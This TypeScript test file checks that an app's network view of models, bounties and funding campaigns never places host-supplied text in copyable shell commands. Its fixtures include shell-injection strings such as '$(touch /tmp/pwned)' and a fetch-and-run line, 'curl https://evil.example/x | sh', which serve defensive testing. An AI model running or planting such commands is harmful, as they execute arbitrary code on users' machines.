import { describe, expect, it } from "vitest";
import {
  BOUNTY_TERMS_NOT_CARRIED, KEEP_MS, NOT_KNOWN_HERE, WHOSE_VIEW, agoText, bountyView, btxOf, byLine, campaignView, coverageOf, coverageText, fundBounty, fundCampaign,
  indexStatusText, isBounty, isCampaign, isOwnCopyOnly, looksLikeLink, mergeBounties, mergeCampaigns, modelView, resultsOf, searchFailText, settle, shortId, silentNote, stateText, trustText,
} from "./netview";

// Shapes and values captured from real engines on 2026-11-23, trimmed
// (lab/evidence/2026-11-23/modelnet-netview/: v16 is upstream v0.34.16).
const ID = "68e5156ac1f5d4ae69b224d2880d939d779179b48f461fb5599c7d3059139fe2c44682621d1419efda4c62e69d36cb7f";
const SIGNER = "0d42d1d21daf89d8a2357f360645e408da8e1cebb8001fe2002c09cdf3182745e02d5f1b0d20212ca12fd7c30ea40174";
const RELEASE = "3d2b0dfa63231c4916dfc6d7f237393d1520c65b5d90008e07797a6aaf2824b0694536e184efa1f47bf14285b8bbdcbf";
const KEY_HASH = "02b42f489691c7faa496c2e025aca3d2fa3d7a4197ebd72ee0d439bfa8c9a11c";
const GRANITE = "btx://pq4admq4hc7nnvddga9z0flrvg8rhxld390gxdjae3nt8gywty205nn7yhruydsxdkx8k9h87c9uj3z3wcs9h";
const QWEN = "btx://pqsltmv73ntyl6x7hf8kclk8fkcxnccsgfy30lmkuqqx0mc5uzhpd9uslhqz2s9x0874vky5yst7nl270yrxm";
const BOUNTY_LINK = "btx://pqdrj326kp7h22u6djynfgsrvnn4mez7d53arpld2en37nqkgnnl3vg35zvgw3gx00mfxx9e5axm9h7kmuhks";

/** v16/x-3-after-campaigns.json: a campaign some other helper published, in getfundablemodels. */
const CAMPAIGN = {
  schema_version: 3, model_id: "79".repeat(48), uri: "btx://pq0yfnde3hy6jqhanm3zdml3wjzuz30yv5sxgaqm7amrr09psy8umn5t6phn3hjtr7lvv4dfzgxje07pvr2mg",
  name: "Test campaign (not real)", publisher: { id: SIGNER, display_name: "local publisher" }, description: "A test campaign.", size_bytes: 200209,
  result_type: "RELEASE_CAMPAIGN", lifecycle_state: "FUNDING", fundable_now: true, search: { score: 0, metadata_verified: true, provenance: [] },
  release: {
    id: RELEASE, release_id: RELEASE, state: "FUNDING", key_hash: KEY_HASH, target_atoms: 300000000, pledged_atoms: 0, funded_atoms: 0,
    confirmed_funded_atoms: 0, pending_funded_atoms: 0, remaining_atoms: 0, value_known: false, pledged_percent: 0, refund_height: 400000,
    funding_source: "OBSERVED_NETWORK_STATE", helper_observation: true, chain_observation: false, actions: ["VIEW_RELEASE", "FUND_RELEASE"],
  },
  economy: { schema_version: 3, result_type: "RELEASE_CAMPAIGN", requires_wallet: true },
};

/** v16/x-3-after-bounties.json: a bounty some other helper published, as its signed search record. */
const BOUNTY_RECORD = {
  schema_version: 2, type: "btx-model-search-v1", model_id: ID, artifact_id: ID, uri: BOUNTY_LINK,
  canonical_name: "Test bounty (not real)", display_name: "Test bounty (not real)", publisher_identity: SIGNER,
  short_description: "A test bounty.", release_target_atoms: 0, signer_id: SIGNER, signed_metadata: true,
  object_kind: "BOUNTY", bounty_id: ID, description: "A test bounty.",
};
/** The same bounty as the result card a peer also sends: a name and a model id, no bounty_id (5-discovery.md, s2). */
const BOUNTY_CARD = {
  schema_version: 3, model_id: ID, uri: BOUNTY_LINK, name: "Test bounty (not real)", description: "A test bounty.",
  result_type: "PUBLIC_MODEL", release: { id: "", state: "PUBLIC", actions: ["DOWNLOAD", "KEEP", "COPY_URI"] }, search: { metadata_verified: true },
};
/** loop-publisher/getbounty.json: the publisher's own view, nothing funded. */
const OWN_ECONOMY = { target_atoms: "500000000", pledged_atoms: "0", confirmed_atoms: null, remaining_atoms: null, funding_progress_known: false, funded_bps: null };

/** Strings a host could put where an id, a hash or a height belongs. */
const HOSTILE = [
  "$(touch /tmp/pwned)", "`touch /tmp/pwned`", 'x" ; touch /tmp/pwned ; "', "x' ; touch /tmp/pwned ; '", `${RELEASE}\ntouch /tmp/pwned`,
  `${RELEASE}$(id)`, `${RELEASE}"`, `${RELEASE}'`, "a".repeat(5000), `${"a".repeat(96)};id`, RELEASE.toUpperCase(), ` ${RELEASE}`,
];
/** Every copy text has exactly one of these whole-string forms. */
const COPY_FORMS = [
  /^[0-9a-f]{96}$/,
  /^btx-cli preparefundmodelrelease "[0-9a-f]{96}" '\{"key_hash":"[0-9a-f]{64}","claimant":"PUBLISHERS_CLAIM_KEY","refund_height":[1-9][0-9]{0,8},"amount_atoms":"YOUR_AMOUNT_IN_ATOMS"\}'$/,
];
const wellFormed = (text: string) => COPY_FORMS.some((f) => f.test(text));

describe("reading upstream's network cards", () => {
  it("turns atoms into BTX", () => {
    expect(btxOf("500000000")).toBe("5 BTX");
    expect(btxOf("1000000")).toBe("0.01 BTX");
    expect(btxOf(12345678900)).toBe("123 BTX");
    expect(btxOf(300000000)).toBe("3 BTX");
    expect(btxOf(null)).toBe("");
    expect(btxOf("abc")).toBe("");
  });

  it("reads a bounty card as the regtest rehearsal returned it", () => {
    // lab/evidence/2026-10-13/bounty-regtest/searchbounties.json, trimmed
    const v = bountyView({ bounty_id: "ab".repeat(48), object_kind: "BOUNTY", title: "BTX Explainer", description: "d", target_atoms: "100000000",
      trust_label: "COUNCIL_CUSTODIAL_AUTHORITY_WITH_INDIVIDUAL_REFUND_PATHS", wallet: false });
    expect(v).toMatchObject({ id: "ab".repeat(48), idBad: false, title: "BTX Explainer", prize: "1 BTX", text: "d", termsMissing: false, raised: NOT_KNOWN_HERE, signer: "" });
    expect(v.trust).toMatch(/council decides/);
    expect(bountyView({}).title).toBe("Untitled bounty");
    expect(trustText("SOME_NEW_LABEL")).toBe("some new label");
  });

  it("reads a bounty some other helper published: a name and a named signer, no prize", () => {
    const v = bountyView(BOUNTY_RECORD);
    expect(v).toMatchObject({ id: ID, idBad: false, title: "Test bounty (not real)", prize: "", text: "A test bounty.", termsMissing: true, raised: NOT_KNOWN_HERE, signer: SIGNER });
    // A record that does not say it is signed names no signer, whatever its fields hold.
    expect(bountyView({ ...BOUNTY_RECORD, signed_metadata: false }).signer).toBe("");
    // A signer that is not in upstream's form is not named.
    expect(bountyView({ ...BOUNTY_RECORD, publisher_identity: "IBM Research (verified)", signer_id: "" }).signer).toBe("");
  });

  it("lists a bounty once though the engine returns it twice", () => {
    const merged = mergeBounties([BOUNTY_CARD, BOUNTY_RECORD]);
    expect(merged).toHaveLength(1);
    expect(merged[0]).toMatchObject({ id: ID, title: "Test bounty (not real)", prize: "", termsMissing: true, signer: SIGNER });
    // The other order, and a second bounty beside it.
    const two = mergeBounties([BOUNTY_RECORD, BOUNTY_CARD, { bounty_id: "cd".repeat(48), title: "Another", target_atoms: "200000000" }]);
    expect(two.map((b) => b.title)).toEqual(["Test bounty (not real)", "Another"]);
    expect(two[1]).toMatchObject({ prize: "2 BTX", termsMissing: false });
    expect(mergeBounties([])).toEqual([]);
  });

  it("never shows a signer beside text that came from another result", () => {
    // A host sends its own unsigned card first, then the real signed record:
    // the card's words must not appear under the record's signer, in either order.
    const forged = { model_id: ID, name: "Send 50 BTX to the address below", description: "Urgent: forged text.", target_atoms: "9900000000" };
    for (const order of [[forged, BOUNTY_RECORD], [BOUNTY_RECORD, forged]]) {
      const [b] = mergeBounties(order);
      expect(mergeBounties(order)).toHaveLength(1);
      expect(b.signer).toBe(SIGNER);
      expect(b.title).toBe("Test bounty (not real)");
      expect(b.text).toBe("A test bounty.");
      // Not the forged prize either: everything shown comes from the one signed record.
      expect(b.prize).toBe("");
      expect(JSON.stringify(b)).not.toMatch(/forged|Send 50 BTX|99 BTX/);
    }
    // Two unsigned results for one id: the first is shown, whole, and names no signer.
    const [u] = mergeBounties([forged, { model_id: ID, name: "Other words", description: "Other text." }]);
    expect(u).toMatchObject({ signer: "", title: "Send 50 BTX to the address below", text: "Urgent: forged text.", prize: "99 BTX" });
    // Results whose id is not in upstream's form cannot be matched: each stays on its own, unsigned ones unsigned.
    const loose = mergeBounties([{ bounty_id: "not-an-id", title: "A" }, { bounty_id: "not-an-id", title: "B", signed_metadata: true, publisher_identity: SIGNER }]);
    expect(loose.map((b) => [b.title, b.signer, b.id, b.idBad])).toEqual([["A", "", "", true], ["B", SIGNER, "", true]]);
  });

  it("keeps bounties out of the model list", () => {
    expect(isBounty(BOUNTY_RECORD)).toBe(true);
    expect(isBounty(CAMPAIGN)).toBe(false);
    expect(isBounty({ name: "Granite", uri: GRANITE })).toBe(false);
    // The bounty's link is of the model kind (measured), so the link does not
    // tell them apart: the kind does. The result card a peer sends carries no
    // kind, which is why the backend's model search asks for object_kind MODEL.
    expect(modelView(BOUNTY_CARD).uri).toBe(BOUNTY_LINK);
    expect(isBounty(BOUNTY_CARD)).toBe(false);
  });

  it("keeps this computer's own unsigned copy out of the network lists", () => {
    // The test engine with a host that did not answer (2026-11-23): the search
    // came back with only the model it holds itself, named "retrieved".
    const own = { name: "retrieved", uri: GRANITE, size_bytes: 2244022910, publisher: {}, sources: 1,
      local: { downloaded: true, known: true, partial: false, pinned: true }, search: { metadata_verified: false, provenance: ["local_index"], score: 1 }, share: { signed: false } };
    expect(isOwnCopyOnly(own)).toBe(true);
    // The same model as the host's signed record returns it, also held here: that one is the network's.
    expect(isOwnCopyOnly({ ...own, name: "Granite 4.2 3B", search: { metadata_verified: true, provenance: ["local_index"] } })).toBe(false);
    // A model that is not here at all.
    expect(isOwnCopyOnly({ name: "Qwen3 8B", uri: QWEN, local: { known: false }, search: { metadata_verified: true } })).toBe(false);
    expect(isOwnCopyOnly({ name: "x", uri: GRANITE })).toBe(false);
  });

  it("reads search results and share cards leniently", () => {
    expect(modelView({ name: "Granite", publisher: "IBM", size_bytes: 2244022910, uri: GRANITE })).toMatchObject({ name: "Granite", by: "IBM", size: "2.2 GB", uri: GRANITE, signed: false, signerId: "" });
    // The card the public host's signed record gives (bridge/network_campaigns-real-host-fresh-engine.json).
    const key = "47ae5947deb2905552910518601e3c381bf9f765e990c520dc1248157f8811f70cae9ebcee5e28c6f26b3a673e95b5a7";
    expect(modelView({ name: "Qwen3 8B", publisher: { id: key, display_name: "Alibaba Qwen" }, family: "qwen3", size_bytes: 5027794846, uri: QWEN, search: { metadata_verified: true, provenance: ["local_index"] }, share: { uri: QWEN, signed: true } }))
      .toMatchObject({ name: "Qwen3 8B", by: "Alibaba Qwen", size: "5 GB", signed: true, signerId: key, uri: QWEN });
    // getmodelsharecard for a model that is neither local nor indexed (live, 2026-10-13)
    expect(modelView({ schema_version: 2, share: { uri: GRANITE, family: "", size_bytes: 0, signed: false }, local: false })).toMatchObject({ uri: GRANITE, name: "", size: "", signed: false });
    // A link the backend would refuse is not a link here either.
    expect(modelView({ name: "x", uri: "btx://x" }).uri).toBe("");
    expect(modelView({ name: "x", uri: `${GRANITE}"><img src=x>` }).uri).toBe("");
    expect(resultsOf({ results: [{ a: 1 }, null, 3] })).toEqual([{ a: 1 }]);
    expect(resultsOf({ code: "NOT_FOUND" })).toEqual([]);
    expect(resultsOf(null)).toEqual([]);
  });

  it("marks a publisher's name as given, and says which key signed", () => {
    // Anyone can sign a record that says "IBM": the signature proves the key, not the name.
    const key = "47ae5947deb2905552910518601e3c381bf9f765e990c520dc1248157f8811f70cae9ebcee5e28c6f26b3a673e95b5a7";
    expect(byLine({ by: "IBM", signed: true, signerId: key })).toBe("IBM (name as given) · signed by key 47ae5947…");
    expect(byLine({ by: "IBM", signed: true, signerId: "" })).toBe("IBM (name as given) · signed record");
    expect(byLine({ by: "IBM", signed: false, signerId: "" })).toBe("IBM (name as given) · not signed");
    expect(byLine({ by: "", signed: true, signerId: key })).toBe("Signed by key 47ae5947…");
    expect(byLine({ by: "", signed: false, signerId: "" })).toBe("Not signed");
    // No wording reads as "IBM, signed": the name is never directly followed by the word.
    for (const signed of [true, false]) expect(byLine({ by: "IBM", signed, signerId: key })).not.toMatch(/IBM\s*[·,]\s*signed/);
    // A name from AInode's own store is its own, not the network's.
    expect(byLine({ by: "IBM", signed: false, signerId: "" }, true)).toBe("IBM");
    // A signer id is named only for a signed record and only in upstream's form.
    expect(modelView({ name: "x", uri: GRANITE, publisher: { id: key, display_name: "IBM" } }).signerId).toBe("");
    expect(modelView({ name: "x", uri: GRANITE, publisher: { id: "IBM-official", display_name: "IBM" }, search: { metadata_verified: true } }).signerId).toBe("");
  });

  it("reads a real campaign card: the numbers are under release", () => {
    const v = campaignView(CAMPAIGN);
    expect(v).toMatchObject({ name: "Test campaign (not real)", goal: "3 BTX", state: "Open for funding", refundHeight: 400000, id: RELEASE, idBad: false, keyHash: KEY_HASH, uri: CAMPAIGN.uri, signed: true, signerId: SIGNER });
    expect(isCampaign(CAMPAIGN)).toBe(true);
    expect(isCampaign({ name: "Granite", uri: GRANITE, release: { id: "", state: "PUBLIC" } })).toBe(false);
    // A campaign in a model search carries its goal on the record too.
    expect(campaignView({ name: "M", release_target_atoms: 300000000, lifecycle_state: "FUNDING" })).toMatchObject({ goal: "3 BTX", state: "Open for funding", id: "", idBad: false });
    expect(stateText("SOMETHING_NEW")).toBe("something new");
    expect(stateText("PUBLIC")).toBe("");
  });

  it("lists a campaign once, and keeps cards that nothing ties together", () => {
    // The campaign list and the model search both return the same campaign.
    expect(mergeCampaigns([CAMPAIGN, { ...CAMPAIGN }])).toHaveLength(1);
    // Same link, no release id in form: still the same campaign.
    expect(mergeCampaigns([{ ...CAMPAIGN, release: { ...CAMPAIGN.release, id: "", release_id: "" } }, { ...CAMPAIGN, release: { target_atoms: 1 } }])).toHaveLength(1);
    // Three cards with no id in form, no link and no name: nothing says they repeat each other.
    const bare = { release: { target_atoms: 100000000, state: "FUNDING" } };
    expect(mergeCampaigns([bare, { ...bare }, { ...bare }])).toHaveLength(3);
    // Nor do two cards that only share a name.
    expect(mergeCampaigns([{ name: "Same", release: { target_atoms: 1 } }, { name: "Same", release: { target_atoms: 2 } }])).toHaveLength(2);
    expect(mergeCampaigns([])).toEqual([]);
  });

  it("tells a pasted link from search words", () => {
    expect(looksLikeLink("  btx://pq4admq4 ")).toBe(true);
    expect(looksLikeLink("granite 3b")).toBe(false);
  });
});

describe("nothing a host sends reaches a terminal by way of the clipboard", () => {
  it("offers a campaign's id and command only when every part has upstream's form", () => {
    const how = fundCampaign(campaignView(CAMPAIGN));
    expect(how.copies.map((c) => c.label)).toEqual(["Copy release id", "Copy first command"]);
    expect(how.copies[0].text).toBe(RELEASE);
    // upstream v0.34.16 `help preparefundmodelrelease`: release id, then key_hash, claimant, refund_height, amount_atoms.
    expect(how.copies[1].text).toBe(
      `btx-cli preparefundmodelrelease "${RELEASE}" '{"key_hash":"${KEY_HASH}","claimant":"PUBLISHERS_CLAIM_KEY","refund_height":400000,"amount_atoms":"YOUR_AMOUNT_IN_ATOMS"}'`,
    );
    for (const c of how.copies) expect(wellFormed(c.text)).toBe(true);
    // No amount is chosen for the user.
    expect(how.copies[1].text).toContain('"amount_atoms":"YOUR_AMOUNT_IN_ATOMS"');
  });

  it("offers nothing to copy when a release id is hostile, and says so", () => {
    for (const bad of HOSTILE) {
      for (const release of [{ ...CAMPAIGN.release, release_id: bad, id: bad }, { ...CAMPAIGN.release, release_id: bad, id: RELEASE }, { ...CAMPAIGN.release, release_id: "", id: bad }]) {
        const view = campaignView({ ...CAMPAIGN, release });
        const how = fundCampaign(view);
        expect(view.id).toBe("");
        expect(view.idBad).toBe(true);
        expect(how.copies).toEqual([]);
        expect(how.lines.join(" ")).toMatch(/not in the form BTX gives its ids.*nothing to copy/);
        // The hostile string is nowhere in what the view model holds.
        expect(JSON.stringify([view, how])).not.toContain("touch /tmp/pwned");
      }
    }
    // The same string as the only id on the card, at the top level.
    const top = campaignView({ name: "M", release_id: HOSTILE[0], release_target_atoms: 1 });
    expect(fundCampaign(top).copies).toEqual([]);
  });

  it("builds no command from a hostile key hash or refund block, and still copies a good id", () => {
    for (const bad of [...HOSTILE, `${KEY_HASH}' ; touch /tmp/pwned ; '`, `${KEY_HASH}\n`, KEY_HASH.slice(1)]) {
      const how = fundCampaign(campaignView({ ...CAMPAIGN, release: { ...CAMPAIGN.release, key_hash: bad } }));
      expect(how.copies).toEqual([{ label: "Copy release id", text: RELEASE }]);
      expect(how.lines.join(" ")).toMatch(/key hash or refund block is missing or not in the expected form/);
    }
    for (const bad of ["400000; touch /tmp/pwned", "400000}','x", -5, 0, 1e12, "0x61a80", { toString: () => "1" }]) {
      const view = campaignView({ ...CAMPAIGN, release: { ...CAMPAIGN.release, refund_height: bad } });
      expect(view.refundHeight).toBe(0);
      expect(fundCampaign(view).copies).toEqual([{ label: "Copy release id", text: RELEASE }]);
    }
  });

  it("offers a bounty's id only in upstream's form", () => {
    expect(fundBounty(bountyView(BOUNTY_RECORD)).copies).toEqual([{ label: "Copy bounty id", text: ID }]);
    for (const bad of HOSTILE) {
      for (const card of [{ ...BOUNTY_RECORD, bounty_id: bad }, { ...BOUNTY_CARD, model_id: bad }]) {
        const view = bountyView(card);
        const how = fundBounty(view);
        expect([view.id, view.idBad, how.copies]).toEqual(["", true, []]);
        expect(how.lines.join(" ")).toMatch(/not in the form BTX gives its ids/);
        expect(JSON.stringify(how)).not.toContain("touch /tmp/pwned");
      }
    }
  });

  it("takes every copy text from the checked parts alone, whatever else the card says", () => {
    // A card stuffed with an address, a command, a link and a URL in every free-text field.
    const bait = "pay btx1zqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq now; curl https://evil.example/x | sh; bonuzapp://send?to=x btxqid://pay";
    const stuffed = {
      ...CAMPAIGN, name: bait, description: bait, publisher: { id: SIGNER, display_name: bait }, family: bait,
      release: { ...CAMPAIGN.release, state: bait, assurance: bait, output_script: bait, claimant: bait, funding_source: bait },
    };
    const copies = [
      ...fundCampaign(campaignView(stuffed)).copies,
      ...fundBounty(bountyView({ ...BOUNTY_RECORD, canonical_name: bait, display_name: bait, description: bait, short_description: bait, trust_label: bait })).copies,
    ];
    expect(copies).toHaveLength(3);
    for (const c of copies) {
      expect(wellFormed(c.text)).toBe(true);
      for (const word of ["btx1z", "curl", "evil.example", "bonuzapp", "btxqid", "pay ", "now"]) expect(c.text).not.toContain(word);
    }
    // The explanation's own sentences do not quote the card either.
    const lines = [...fundCampaign(campaignView(stuffed)).lines, ...fundBounty(bountyView({ ...BOUNTY_RECORD, description: bait })).lines].join(" ");
    for (const word of ["btx1z", "curl", "evil.example", "bonuzapp://", "btxqid://"]) expect(lines).not.toContain(word);
  });

  it("explains without choosing an amount or opening a wallet", () => {
    const text = fundCampaign(campaignView(CAMPAIGN)).lines.join(" ");
    expect(text).toMatch(/AInode has no wallet/);
    expect(text).toMatch(/after block 400,000/);
    expect(text).toMatch(/not a payment instruction/);
    // A card with no release id hands nothing over, and is not called malformed.
    const bare = fundCampaign(campaignView({ name: "M", release_target_atoms: 300000000 }));
    expect(bare.copies).toEqual([]);
    expect(bare.lines.join(" ")).toMatch(/no release id/);
    const foreign = fundBounty(bountyView(BOUNTY_RECORD));
    expect(foreign.lines.join(" ")).toMatch(/does not carry the terms/);
    expect(BOUNTY_TERMS_NOT_CARRIED).toMatch(/not carried by the network yet/);
    const own = fundBounty(bountyView({ bounty_id: "ab".repeat(48), title: "BTX Explainer", target_atoms: "500000000" }));
    expect(own.lines.join(" ")).not.toMatch(/does not carry the terms/);
    expect(own.lines.join(" ")).toMatch(/preparebountyfunding/);
  });
});

describe("the copy rules, upstream's own", () => {
  it("never shows a pledge as raised", () => {
    // "Never display '90% funded' for a 90% pledge" (doc/modelnet/model-economy.md).
    const pledged = { ...CAMPAIGN, release: { ...CAMPAIGN.release, pledged_atoms: 270000000, pledged_percent: 90, pledged_percent_milli: 90000 } };
    const v = campaignView(pledged);
    expect(v.raised).toBe(NOT_KNOWN_HERE);
    expect(`${v.raised} ${v.goal} ${v.state} ${v.text}`).not.toMatch(/90|2\.7 BTX|%/);
  });

  it("says not known, never 0, when the engine does not know the funding", () => {
    expect(campaignView(CAMPAIGN).raised).toBe("Raised: not known here");
    // value_known alone is not enough: the source must be the chain.
    expect(campaignView({ ...CAMPAIGN, release: { ...CAMPAIGN.release, value_known: true, confirmed_funded_atoms: 100000000 } }).raised).toBe(NOT_KNOWN_HERE);
    // funded_atoms from a helper's own bookkeeping is not shown either.
    expect(campaignView({ ...CAMPAIGN, release: { ...CAMPAIGN.release, funded_atoms: 100000000 } }).raised).toBe(NOT_KNOWN_HERE);
    expect(bountyView({ title: "B", target_atoms: "500000000", economy: OWN_ECONOMY }).raised).toBe(NOT_KNOWN_HERE);
    expect(bountyView({ title: "B", economy: { ...OWN_ECONOMY, pledged_atoms: "400000000" } }).raised).toBe(NOT_KNOWN_HERE);
  });

  it("shows an amount only when the engine knows it from the chain", () => {
    const chain = { ...CAMPAIGN.release, value_known: true, funding_source: "CHAIN_OBSERVATION", chain_observation: true, confirmed_funded_atoms: 120000000 };
    expect(campaignView({ ...CAMPAIGN, release: chain }).raised).toBe("Raised: 1.2 BTX of 3 BTX (40%)");
    // Known from the chain and nothing paid in yet: that zero is a fact.
    expect(campaignView({ ...CAMPAIGN, release: { ...chain, confirmed_funded_atoms: 0 } }).raised).toBe("Raised: 0 BTX of 3 BTX (0%)");
    expect(campaignView({ ...CAMPAIGN, release: { ...chain, confirmed_funded_atoms: 900000000 } }).raised).toBe("Raised: 9 BTX of 3 BTX (100%)");
    expect(bountyView({ title: "B", target_atoms: "500000000", economy: { target_atoms: "500000000", confirmed_atoms: "200000000", funding_progress_known: true } }).raised)
      .toBe("Raised: 2 BTX of 5 BTX");
  });

  it("counts whom the engine asked from its own counters, searchmodels and searchbounties alike", () => {
    // live/searchmodels-granite.json and live/searchbounties-network.json
    const search = { coverage: { local: true, connected_peers_queried: 1, index_peers_queried: 0, index_peers_configured: 0, responses_received: 1, timed_out: 0 }, results: [] };
    const bounties = { results: [], scope: "NETWORK", index_peers_configured: 0, index_peers_queried: 0, responses_received: 1, timed_out: 0, fanout_attempted: true };
    expect(coverageOf(search, 7)).toEqual({ asked: 1, answered: 1, indexPeers: 0, atMs: 7 });
    expect(coverageOf(bounties, 7)).toEqual({ asked: 1, answered: 1, indexPeers: 0, atMs: 7 });
    // v16/x-1-before-refresh-search.json: the host did not answer that time.
    const silent = { coverage: { connected_peers_queried: 0, index_peers_queried: 0, responses_received: 0, timed_out: 1 }, results: [] };
    expect(coverageOf(silent, 7)).toMatchObject({ asked: 1, answered: 0 });
    // Two index peers, one that does not exist: the engine counts only the one
    // that answered in index_peers_queried (the dev bridge, 2026-11-24).
    expect(coverageOf({ coverage: { connected_peers_queried: 0, index_peers_queried: 1, index_peers_configured: 2, responses_received: 1, timed_out: 1 } }, 7))
      .toEqual({ asked: 2, answered: 1, indexPeers: 2, atMs: 7 });
    // The built-in host as model host and index peer: one host, asked once, as an index peer.
    expect(coverageOf({ coverage: { connected_peers_queried: 0, index_peers_queried: 1, index_peers_configured: 1, responses_received: 1, timed_out: 0 } }, 7))
      .toEqual({ asked: 1, answered: 1, indexPeers: 1, atMs: 7 });
    // An index peer (5-discovery.md, s5).
    expect(coverageOf({ coverage: { connected_peers_queried: 1, index_peers_queried: 1, responses_received: 2, timed_out: 0 } }, 7)).toMatchObject({ asked: 2, answered: 2, indexPeers: 1 });
    // No counters: a local call, an error, nothing.
    expect(coverageOf({ results: [], sort: "NEARLY_FUNDED" }, 7)).toBeNull();
    expect(coverageOf(null, 7)).toBeNull();
  });

  it("words the coverage line from those counters only", () => {
    expect(coverageText({ asked: 1, answered: 1, indexPeers: 0, atMs: 0 })).toBe("Asked 1 host. 1 answered.");
    expect(coverageText({ asked: 2, answered: 2, indexPeers: 1, atMs: 0 })).toBe("Asked 1 host and 1 index peer. 2 answered.");
    expect(coverageText({ asked: 3, answered: 1, indexPeers: 0, atMs: 0 })).toBe("Asked 3 hosts. 1 answered.");
    expect(coverageText({ asked: 1, answered: 0, indexPeers: 0, atMs: 0 })).toBe("Asked 1 host. None answered.");
    expect(coverageText({ asked: 0, answered: 0, indexPeers: 0, atMs: 0 })).toBe("No host was asked.");
    expect(coverageText(null)).toBe("");
    // Whose view it is: upstream's sentence, never "all models on BTX".
    expect(WHOSE_VIEW).toMatch(/current network view, not a complete directory/);
  });

  it("says so when a list is shown although no host answered", () => {
    // The test engine with a host that does not exist still listed the four
    // models from records it had kept (2026-11-23).
    expect(silentNote({ asked: 1, answered: 0, indexPeers: 0, atMs: 0 })).toMatch(/No host answered this time.*kept from earlier answers/);
    expect(silentNote({ asked: 1, answered: 1, indexPeers: 0, atMs: 0 })).toBe("");
    expect(silentNote({ asked: 0, answered: 0, indexPeers: 0, atMs: 0 })).toBe("");
    expect(silentNote(null)).toBe("");
  });

  it("says how old an answer is", () => {
    expect(agoText(1000, 3000)).toBe("just now");
    expect(agoText(0, 12_000)).toBe("12 seconds ago");
    expect(agoText(0, 4 * 60_000)).toBe("4 minutes ago");
    expect(agoText(0, 3 * 3600_000)).toBe("3 hours ago");
    expect(agoText(5000, 0)).toBe("just now");
  });

  it("keeps the last good answer when a refresh fails or comes back empty", () => {
    const first = settle(["a", "b"], null, 1000);
    expect(first).toEqual({ items: ["a", "b"], stale: "", kept: { items: ["a", "b"], atMs: 1000 } });
    // Empty this time: the earlier answer stays, marked and dated.
    const empty = settle<string>([], first.kept, 1000 + 4 * 60_000);
    expect(empty.items).toEqual(["a", "b"]);
    expect(empty.stale).toBe("Nothing came back this time. Shown: the answer from 4 minutes ago.");
    // The engine did not answer at all.
    expect(settle<string>(null, first.kept, 31_000).stale).toBe("The engine did not answer this time. Shown: the answer from 30 seconds ago.");
    // Too old to describe the network: dropped.
    expect(settle<string>([], first.kept, 1000 + KEEP_MS + 1)).toEqual({ items: [], stale: "", kept: null });
    // Nothing kept, nothing came: empty, and not stale.
    expect(settle<string>([], null, 5)).toEqual({ items: [], stale: "", kept: null });
    // A new answer replaces the kept one.
    expect(settle(["c"], first.kept, 9000).kept).toEqual({ items: ["c"], atMs: 9000 });
  });

  it("dates a kept answer by when a host last answered, not by a refresh nobody answered", () => {
    const quiet = "No host answered this time. Shown: what this AInode's engine kept from earlier answers.";
    const first = settle(["a"], null, 1000);
    // Ten minutes later no host answers; the engine fills the list from its kept records.
    const silent = settle(["a"], first.kept, 1000 + 10 * 60_000, false, quiet);
    expect(silent.items).toEqual(["a"]);
    expect(silent.stale).toBe(quiet);
    expect(silent.kept).toEqual({ items: ["a"], atMs: 1000 });
    // Five minutes on, a refresh comes back empty: the note dates the answer to the host's last one, 15 minutes ago.
    const later = settle<string>([], silent.kept, 1000 + 15 * 60_000);
    expect(later.stale).toBe("Nothing came back this time. Shown: the answer from 15 minutes ago.");
    // A list that only ever came while no host answered is never kept as an answer.
    const never = settle(["x"], null, 2000, false, quiet);
    expect(never).toEqual({ items: ["x"], stale: quiet, kept: null });
    expect(settle<string>([], never.kept, 3000)).toEqual({ items: [], stale: "", kept: null });
    // And an old kept answer is not revived by a silent refresh.
    expect(settle(["y"], first.kept, 1000 + KEEP_MS + 1, false, quiet).kept).toBeNull();
  });

  it("shortens an id for a card and keeps a short one whole", () => {
    expect(shortId("a".repeat(96))).toBe(`${"a".repeat(16)}…`);
    expect(shortId("abc")).toBe("abc");
  });

  it("says what the engine reports about the hosts it asks, and no more", () => {
    // Not asked yet in this run.
    expect(indexStatusText(1, null, 0)).toBe("Not asked yet in this engine run. The hosts are asked when a search runs.");
    expect(indexStatusText(0, null, 0)).toBe("Not asked yet in this engine run. The hosts are asked when a search runs.");
    // The built-in host as index peer and as model host is one host: asked once.
    expect(indexStatusText(1, { asked: 1, answered: 1, indexPeers: 1, atMs: 0 }, 3000)).toBe("Last search, just now: Asked 1 index peer. 1 answered.");
    // Two hosts, one answered: totals only, and it says that it cannot tell which.
    expect(indexStatusText(2, { asked: 3, answered: 2, indexPeers: 2, atMs: 0 }, 60_000))
      .toBe("Last search, 60 seconds ago: Asked 1 host and 2 index peers. 2 answered. The engine does not say which host answered.");
    expect(indexStatusText(2, { asked: 2, answered: 0, indexPeers: 1, atMs: 0 }, 0)).toMatch(/None answered\. The engine does not say which host answered\.$/);
    // No host in the list: the model host alone was asked.
    expect(indexStatusText(0, { asked: 1, answered: 1, indexPeers: 0, atMs: 0 }, 0)).toBe("Last search, just now: Asked 1 host. 1 answered.");
  });
});

describe("searchFailText", () => {
  it("says what to do when the search ran out of time, not the engine's words", () => {
    const t = searchFailText("engine did not answer searchmodels in time");
    expect(t).toContain("No answer in time");
    expect(t).toContain("Press Refresh");
    expect(t).not.toContain("searchmodels");
    expect(searchFailText("engine busy, searchmodels not sent")).toContain("Press Refresh");
  });
  it("passes any other reason on as it came", () => {
    expect(searchFailText("the engine gave no reason")).toBe("The network search did not answer: the engine gave no reason");
  });
});
